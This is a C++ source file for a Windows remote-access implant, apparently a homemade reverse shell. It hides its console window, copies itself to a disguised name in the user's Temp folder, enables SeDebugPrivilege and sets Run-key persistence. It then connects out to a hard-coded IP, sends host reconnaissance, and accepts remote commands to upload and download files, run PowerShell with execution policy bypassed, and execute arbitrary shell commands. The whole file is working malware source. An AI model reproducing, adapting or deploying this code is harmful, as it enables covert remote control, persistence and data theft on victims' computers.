// C++ Headers
#ifdef _WIN32
#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <ws2tcpip.h>       //TCP-IP Header
// C Header
#include <stdio.h>          //Input Output Header
// Debug C++ Header
//#include <iostream>     	//Input Output Debug Header
// Self imported
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
// Import for listing file
#include <cstring>
#include <io.h>

// Note: could also use malloc() and free()
#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
#endif

#ifdef linux
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#endif

extern "C" void mainCRTStartup();

// Windows
// g++ -std=c++11 client.cpp -o client.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
// g++ -std=c++11 ..\Documents\client.cpp -o client.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
// g++ -std=gnu++11 ..\Documents\client.cpp -o client.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

// Linux  
//i686-w64-mingw32-g++ -std=c++11 client.cpp -o client.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

// https://niiconsulting.com/checkmate/2018/03/

void whoami(char* returnval, int returnsize) {
	DWORD bufferlen = 257;
	GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize) {
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}
	
void pwd(char* returnval, int returnsize) {
	#ifdef _WIN32
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
	#endif
}

char *getprocarch() {
	// Return current process architecture
	SYSTEM_INFO stInfo;
	GetSystemInfo(&stInfo);
	char *procarch = "";
	
	switch( stInfo.wProcessorArchitecture ){
	case PROCESSOR_ARCHITECTURE_INTEL:
		procarch = "Intel x86";
		break;
	case PROCESSOR_ARCHITECTURE_IA64:
		procarch = "Intel x64";
		break;
	case PROCESSOR_ARCHITECTURE_AMD64:
		procarch = "AMD 64";
		break;
	default:
		procarch = "Unknown";
	}

	return procarch;
}

int getip(char * hostname , char* ip) {  
	struct hostent *he;     
	struct in_addr **addr_list;     
	int i;
	
	if ((he = gethostbyname(hostname)) == NULL) { 
		//herror("gethostbyname");         
		return 1;
	}     
	addr_list = (struct in_addr **) he->h_addr_list;
	for(i = 0; addr_list[i] != NULL; i++) {   
		strcpy(ip , inet_ntoa(*addr_list[i]) );
		return 0;
	}
	return 1;
}

void renameprocess() {
	char szFileName[MAX_PATH];
	char szDestination[MAX_PATH] = "";
	DWORD bufferlen = 257;
	char username[100];
	
	whoami(username, 257);
	strcat(szDestination, "C:\\Users\\");
	strcat(szDestination, username);
	strcat(szDestination, "\\AppData\\Local\\Temp\\winerpUI.exe");

	GetModuleFileName(NULL, szFileName, MAX_PATH);
	//char *filename = strrchr(szFileName, '\\');
	////std::cout << "Filename: " << filename+1 << std::endl;
	rename(szFileName, szDestination);
	//std::cout << "Process renamed..." << std::endl;
	
	/*STARTUPINFO si = {sizeof( STARTUPINFO )};
    PROCESS_INFORMATION pi;
    CreateProcess( szDestination, 0, 0, 0, 0, 0, 0, 0, &si, &pi);
	
	// Close connection
	closesocket(tcpsock);
	WSACleanup();
	exit(0);*/
}

void list(char* dir, char* buffer) {
	char originalDirectory[MAX_PATH];

	// Get the current directory so we can return to it
	_getcwd(originalDirectory, MAX_PATH);

	_chdir(dir);  // Change to the working directory
	_finddata_t fileinfo;

	// This will grab the first file in the directory
	// "*" can be changed if you only want to look for specific files
	intptr_t handle = _findfirst("*", &fileinfo);

	if (handle == -1) {  // No files or directories found
		perror("Error searching for file");
		exit(1);
	}

	do {
		if (strcmp(fileinfo.name, ".") == 0 || strcmp(fileinfo.name, "..") == 0)
			continue;
		if (fileinfo.attrib & _A_SUBDIR) {
			// Fill buffer with files and directories
			strcat(buffer, strcat(fileinfo.name, "\n"));
		} else {
			strcat(buffer, strcat(fileinfo.name, "\n"));
		}
	} while (_findnext(handle, &fileinfo) == 0);

	_findclose(handle); // Close the stream
	_chdir(originalDirectory);
}

bool EnableWindowsPrivilege(){
	HANDLE token;
	TOKEN_PRIVILEGES priv;
	BOOL ret = FALSE;
	TCHAR *privilege = "SeDebugPrivilege";
	
	//std::cout << "Enabling SeDebug" << std::endl;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES| TOKEN_QUERY, &token)) { 
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
		if (LookupPrivilegeValue(NULL, privilege, &priv.Privileges[0].Luid) != FALSE&&AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
			ret = TRUE;
		}
		
		// In case privilege is not part of token (ex run as non admin)
		//if(GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
			//ret = FALSE;
		//}
		
		CloseHandle(token);
	}
	
	if (ret == TRUE) {
		//std::cout << "SeDebug successfully enabled for this process." << std::endl;
	} else {
		//std::cout << "Failed to enable SeDebug." << std::endl;
		return ret;
	}
}

void runkey_persist() {
	HKEY hKey;
	char buffer[MAX_PATH] = ""; 
	//DWORD pathLen = 0;
	char username[100];
	
	whoami(username, 257);
	strcat(buffer, "C:\\Users\\");
	strcat(buffer, username);
	strcat(buffer, "\\AppData\\Local\\Temp\\winerpUI.exe");
	
	RegOpenKey( HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
	
	//pathLen = GetModuleFileName(NULL, buffer, MAX_PATH);				
	//DWORD pathLenInBytes = pathLen * sizeof(*buffer);
		
	RegSetValueEx( hKey, TEXT("winerpUI"), 0, REG_SZ, (LPBYTE)buffer, sizeof(buffer) );
	//std::cout << "Set persistence" << std::endl;
	RegCloseKey(hKey);
}

char *clean_persistance() {
	HKEY hKey;
	char *buffer = "";
	
	RegOpenKey( HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
	RegDeleteValue(hKey, TEXT("winerpUI"));
	RegCloseKey(hKey);
	buffer = "Persistence successfully cleaned";
	
	return buffer;
}	

void RevShell() {
	WSADATA wsaver;
	WSAStartup(MAKEWORD(2,2), &wsaver);
	// Create new socket
	SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	int port = 50500;
	
	// Set connection details
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	// addr.sin_addr.s_addr = inet_addr("62.171.186.128");
	addr.sin_addr.s_addr = inet_addr("192.168.0.223");
	addr.sin_port = htons(port);
	
	if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		exit(0);
	} else {
		//std::cout << "Starting initial recon..." << std::endl;
		char buffer[2048];
		char *procarch = "";
		char *ipaddress = "";
		
		char s_hostname[257] = "";
		char ip[100];
		char cwd[100];
		char user[100];
		
		#ifdef _WIN32
		// Run only on winblows systems
		// Rename current process
		renameprocess();		
		
		// Enable SeDebugPrivilege for current process
		EnableWindowsPrivilege();
		
		// Establish persistence
		runkey_persist();
		
		/* Migrate current process to another process
		if (migrate()) {
			//std::cout << "Migration succeeded!" << std::endl;
		} else {
			//std::cout << "Migration failed!" << std::endl;
		}*/
		
		// Get current process architecture
		procarch = getprocarch();
		
		// Get hostname for ip lookup
		hostname(s_hostname, 257);
		
		// Lookup ip
		getip(s_hostname , ip);
		
		// Current working directory
		pwd(cwd, 257);
		
		// Get current user
		whoami(user, 257);
		
		// Prepare string to send back to server
		// Add process architecture to buffer
		strcpy(buffer, procarch);
		// Add ip to buffer
		strcat(buffer, ";");
		strcat(buffer, s_hostname);
		strcat(buffer, ";");
		strcat(buffer, ip);
		strcat(buffer, ";");
		strcat(buffer, cwd);
		strcat(buffer, ";");
		strcat(buffer, user);
		
		// Send the buffer to server
		send(tcpsock, buffer, strlen(buffer) + 1, 0);
		#endif

		//std::cout << "[+] Connected. Waiting for commands..."  << std::endl;
		
		char CommandReceived[DEFAULT_BUFLEN] = "";

		while(true) {
			int result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
			//std::cout << "Command received: " << CommandReceived << std::endl;
			//std::cout << "Length of command: " << result << std::endl;
			
			if ((strcmp(CommandReceived, "pwd") == 0)) {
				// Get command data and send to server
				char buffer[257] = "";
				pwd(buffer,257);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer)+1, 0);
				
				// Clear both buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			} else if ((strcmp(CommandReceived, "whoami") == 0)) {
				// Get command data and send to server
				char buffer[257] = "";
				whoami(buffer,257);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer)+1, 0);
				
				// Clear both buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			} else if ((strcmp(CommandReceived, "hostname") == 0)){
				// Get command data and send to server
				char buffer[257] = "";
				hostname(buffer,257);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer)+1, 0);
				
				// Clear both buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			} else if ((strcmp(CommandReceived, "cleanpersist")) == 0) {
				// Clean persistence mechanics
				char buffer[257] = "";
				char *cleaned = "";
				cleaned = clean_persistance();
				
				strcpy(buffer, cleaned);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer)+1, 0);
				
				// Clear both buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			} else if ((strcmp(CommandReceived, "quit") == 0)) {
				// Close connection
				closesocket(tcpsock);
				WSACleanup();
				exit(0);
			} else if ((strcmp(CommandReceived, "ls") == 0) || (strcmp(CommandReceived, "dir") == 0)) {
				char buffer[10240] = "\n";
				char currentdir[257];
				pwd(currentdir,257);
				
				list(currentdir, buffer);
				// Send the buffer to server
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				
				// Clear both buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			} else if ((strcmp(CommandReceived, " ") == 0)) {
				char buffer[257] = "";
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				
				// Clear both buffers
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			} else {
				// First value of received command
				char *token = strtok(CommandReceived," ");
				
				// File upload to victim
				if ((strcmp(token, "put") == 0)) {
					size_t len;
					char filebuffer[BUFSIZ];
					int file_size;
					char *filename;
					FILE *received_file;
					int remain_data = 0;
					
					// Get filename
					filename = strtok(NULL, " ");

					// Receiving filesize
					recv(tcpsock, filebuffer, BUFSIZ, 0);
					file_size = atoi(filebuffer);
					//std::cout << "Filesize received: " << filebuffer << std::endl;
					//std::cout << "Starting upload of file." << std::endl;
					
					if((received_file=fopen(filename, "wb")) == NULL) {
						char buffer[257] = "";
						strcat(buffer, "Error uploading file.");
						send(tcpsock, buffer, strlen(buffer) + 1, 0);						
					} else {
						char buffer[257] = "";
						remain_data = file_size;
						
						// Send file
						while ((remain_data > 0) && (len = recv(tcpsock, filebuffer, BUFSIZ, 0)) > 0) {
							fwrite(filebuffer, sizeof(char), len, received_file);
							remain_data -= len;
						}					
						
						// Close file
						//std::cout << "[DEBUG] Closing file..." << std::endl;
						fclose(received_file);
						strcat(buffer, "File successfully uploaded.");
						send(tcpsock, buffer, strlen(buffer) + 1, 0);
					}
					
					// Clear both buffers
					memset(buffer, 0, sizeof(buffer));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				} else if ((strcmp(token, "get") == 0)) {
					char datasize[BUFSIZ];
					char buffer[257] = "";
					char *filename;
					long filesize = 0;
					int sent = 0;
					FILE *fp;
					
					// Get filename
					filename = strtok(NULL, " ");
					//std::cout << "Filename: " << filename << std::endl;
					
					if ((fp=fopen(filename, "rb")) != NULL) {
						//std::cout << "Getting filesize" << std::endl;
						fseek(fp, 0, SEEK_END);
						filesize = ftell(fp);
						rewind(fp);
						//std::cout << "Filesize: " << filesize << std::endl;
						
						// Send datasize to server
						sprintf(datasize,"%d",filesize);
						send(tcpsock, datasize, strlen(datasize) + 1, 0);
						
						char *filebuffer = (char*)malloc(sizeof(char)*filesize);
						// Store read data in filebuffer
						fread(filebuffer, sizeof(char), filesize, fp);
						
						// Send buffer to server
						while (sent < filesize) {
							int n = send(tcpsock, filebuffer + sent, filesize - sent, 0);
							if (n == -1)
								break;
							
							sent += n;
						}
						
						//std::cout << "File sent to server." << std::endl;
					} else {
						perror("Error");
					}
					
					// Close the file so it's not in use anymore
					fclose(fp);
					
					// Clear both buffers
					memset(buffer, 0, sizeof(buffer));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				} else if ((strcmp(token, "cd") == 0)) {
					const char *path;
					char buffer[257];
					
					path = strtok(NULL, " ");
					//std::cout << "Path: " << path << std::endl;
					chdir(path);
					
					pwd(buffer, 257);
					send(tcpsock, buffer, strlen(buffer)+1, 0);
					
					// Clear both buffers
					memset(buffer, 0, sizeof(buffer));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				} else if ((strcmp(token, "ps") == 0)) {
					char command[4096];
					char buffer[8192];
					char message[BUFSIZ];
					
					memcpy(command, CommandReceived + 3, sizeof(CommandReceived));
					//std::cout << "Command: " << command << std::endl;
					
					strcat(buffer, "powershell -ExecutionPolicy Bypass ");
					strcat(buffer, command);
					system(buffer);
					
					strcat(message, "Powershell command executed!");
					send(tcpsock, message, strlen(message)+1, 0);
					
					// Clear both buffers
					memset(buffer, 0, sizeof(buffer));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				} else if ((strcmp(token, "exec") == 0)){
					char command[4096];
					char psBuffer[BUFSIZ];
					char output[4096];
					FILE *pPipe;
					
					memcpy(command, CommandReceived + 5, sizeof(CommandReceived));
					
					if( (pPipe = _popen( command, "rt" )) == NULL ) {
						exit( 1 );
					}
					
					while(fgets(psBuffer, 128, pPipe)) {
						strcat(output, psBuffer);
					}
					
					_pclose( pPipe );
					
					send(tcpsock, output, strlen(output)+1, 0);
					
					// Clear both buffers
					memset(output, 0, sizeof(output));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				} else {					
					//std::cout << "Command not parsed!" << std::endl;
				}
			}
			memset(CommandReceived, 0, sizeof(CommandReceived));
		}
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}

int main() {
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	//ShowWindow(stealth,SW_SHOWNORMAL);
	ShowWindow(stealth,SW_HIDE);
	RevShell();
	return 0;
}
